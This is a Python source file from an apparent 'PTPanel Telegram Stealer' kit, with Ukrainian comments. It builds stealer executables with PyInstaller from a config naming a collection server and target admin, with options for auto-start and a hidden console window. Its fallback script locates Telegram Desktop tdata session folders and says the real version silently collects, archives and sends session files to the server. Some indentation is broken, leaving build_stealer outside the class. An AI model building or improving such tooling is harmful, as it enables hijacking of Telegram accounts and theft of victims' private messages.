# core/stealer_builder.py - ВИПРАВЛЕНА ВЕРСІЯ
import logging
import os
import json
import shutil
import subprocess
import tempfile
from typing import Dict, Any

logger = logging.getLogger(__name__)

class StealerBuilder:
    """Builder for Python stealers with PyInstaller compilation"""
    
    def __init__(self):
        logger.info("StealerBuilder initialized")
    
    # core/stealer_builder.py - ОНОВЛЕНА ФУНКЦІЯ build_stealer
def build_stealer(self, config: Dict[str, Any], output_path: str) -> bool:
    """Build stealer with PyInstaller compilation"""
    try:
        # Отримуємо налаштування з форми
        features = config.get('features', [])
        auto_start = config.get('auto_start', False)
        hide_process = config.get('hide_process', False)
        
        # Повна конфігурація для стіллера
        stealer_config = {
            'server_url': config.get('server_url'),
            'admin_id': config.get('admin_id'),
            'target_admin': config.get('target_admin'),
            'features': features,
            'auto_start': auto_start,
            'hide_process': hide_process,
            'version': '1.0.0'
        }
        
        logger.info(f"Building stealer with features: {features}")
        logger.info(f"Auto start: {auto_start}, Hide process: {hide_process}")
        
        # Створюємо папку для виводу
        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        
        # Створюємо тимчасову папку для білда
        with tempfile.TemporaryDirectory() as temp_dir:
            build_dir = os.path.join(temp_dir, "build")
            os.makedirs(build_dir)
            
            # Копіюємо клієнтський код
            client_source = "client/stealer.py"
            if not os.path.exists(client_source):
                logger.error(f"Client source not found: {client_source}")
                return self._create_fallback_script(output_path, stealer_config)
            
            shutil.copy(client_source, os.path.join(build_dir, "stealer.py"))
            
            # Створюємо конфігураційний файл
            config_file = os.path.join(build_dir, "config.json")
            with open(config_file, 'w', encoding='utf-8') as f:
                json.dump(stealer_config, f, indent=2, ensure_ascii=False)
            
            # Створюємо main.py для компіляції
            main_py_content = self._generate_main_script()
            main_py_path = os.path.join(build_dir, "main.py")
            with open(main_py_path, 'w', encoding='utf-8') as f:
                f.write(main_py_content)
            
            logger.info(f"Building stealer to: {output_path}")
            
            # Компілюємо через PyInstaller
            if self._compile_with_pyinstaller(main_py_path, config_file, output_path, stealer_config):
                logger.info(f"Stealer built successfully: {output_path}")
                return True
            else:
                logger.error("PyInstaller compilation failed")
                return self._create_fallback_script(output_path, stealer_config)
                
    except Exception as e:
        logger.error(f"Build failed: {e}")
        return self._create_fallback_script(output_path, config)
    
    def _generate_main_script(self):
        """Генерація головного скрипту"""
        return '''import os
import sys
import json

# Додаємо шлях до поточної папки
current_dir = os.path.dirname(os.path.abspath(__file__))
if current_dir not in sys.path:
    sys.path.insert(0, current_dir)

try:
    from stealer import main
except ImportError as e:
    print(f"Import error: {e}")
    print("Current directory:", os.getcwd())
    print("Python path:", sys.path)
    input("Press Enter to exit...")
    sys.exit(1)

if __name__ == "__main__":
    # Змінюємо робочу директорію на папку з exe
    if getattr(sys, 'frozen', False):
        os.chdir(os.path.dirname(sys.executable))
    
    main()
'''
    
    def _compile_with_pyinstaller(self, main_script: str, config_file: str, output_path: str, config: Dict[str, Any]) -> bool:
        """Компіляція через PyInstaller"""
        try:
            # Базова команда PyInstaller
            cmd = [
                'pyinstaller',
                '--onefile',
                '--console',
                '--name', os.path.basename(output_path).replace('.exe', ''),
                '--distpath', os.path.dirname(output_path),
                '--workpath', 'build/pyinstaller',
                '--specpath', 'build/spec',
                '--add-data', f'{config_file};.',
                '--hidden-import=requests',
                '--hidden-import=json',
                '--hidden-import=logging',
                '--hidden-import=zipfile',
                '--hidden-import=tempfile',
                '--hidden-import=pathlib',
                '--clean',  # Очистити попередні білди
            ]
            
            # Додаткові налаштування
            if config.get('hide_process'):
                cmd.remove('--console')
                cmd.append('--noconsole')
            
            # Додаємо основний скрипт в кінець
            cmd.append(main_script)
            
            logger.info(f"Running PyInstaller: {' '.join(cmd)}")
            
            # Запускаємо PyInstaller
            result = subprocess.run(cmd, capture_output=True, text=True, cwd=os.getcwd())
            
            if result.returncode == 0:
                # Перевіряємо чи .exe файл створений
                if os.path.exists(output_path):
                    logger.info(f"PyInstaller successful: {output_path}")
                    return True
                else:
                    # Шукаємо .exe в стандартній папці dist/
                    dist_exe = os.path.join('dist', os.path.basename(output_path))
                    if os.path.exists(dist_exe):
                        shutil.move(dist_exe, output_path)
                        logger.info(f"Moved from dist: {output_path}")
                        return True
                    else:
                        logger.error("EXE file not found after compilation")
                        return False
            else:
                logger.error(f"PyInstaller error: {result.stderr}")
                return False
                
        except Exception as e:
            logger.error(f"PyInstaller execution error: {e}")
            return False
    
    def _create_fallback_script(self, output_path: str, config: Dict[str, Any]) -> bool:
        """Резервний Python скрипт"""
        try:
            # Створюємо простий функціональний скрипт
            script_content = f'''#!/usr/bin/env python3
import os
import sys
import json
import platform
from pathlib import Path

CONFIG = {json.dumps(config, indent=2)}

def find_telegram():
    """Пошук Telegram"""
    system = platform.system()
    paths = []
    
    if system == "Windows":
        appdata = os.getenv('APPDATA')
        telegram_path = os.path.join(appdata, 'Telegram Desktop', 'tdata')
        if os.path.exists(telegram_path):
            paths.append(telegram_path)
    
    return paths

def main():
    print("🛡️ PTPanel Telegram Stealer")
    print("=" * 40)
    print(f"Target: {{CONFIG.get('target_admin')}}")
    print(f"Features: {{', '.join(CONFIG.get('features', []))}}")
    print()
    
    # Пошук Telegram
    print("🔍 Searching for Telegram...")
    paths = find_telegram()
    
    if paths:
        print(f"✅ Found {{len(paths)}} Telegram installation(s)")
        for path in paths:
            print(f"   📁 {{path}}")
            
            # Підрахунок файлів
            try:
                file_count = 0
                for root, dirs, files in os.walk(path):
                    file_count += len(files)
                    if file_count > 100:  # Ліміт для швидкості
                        break
                print(f"   📊 Files: {{file_count}}+")
            except:
                print("   📊 Files: Access denied")
    else:
        print("❌ Telegram not found")
    
    print()
    print("💡 Real version would:")
    print("   - Collect session files")
    print("   - Archive data")
    print("   - Send to server silently")
    print()
    input("Press Enter to exit...")

if __name__ == "__main__":
    main()
'''
            
            script_path = output_path.replace('.exe', '.py')
            with open(script_path, 'w', encoding='utf-8') as f:
                f.write(script_content)
            
            logger.info(f"Fallback script created: {script_path}")
            
            # Також створюємо .bat файл для легкого запуску
            bat_content = f'''@echo off
title PTPanel Stealer
python "{os.path.basename(script_path)}"
pause
'''
            bat_path = output_path.replace('.exe', '.bat')
            with open(bat_path, 'w') as f:
                f.write(bat_content)
            
            return True
            
        except Exception as e:
            logger.error(f"Fallback creation failed: {e}")
            return False

# Global instance
stealer_builder = StealerBuilder()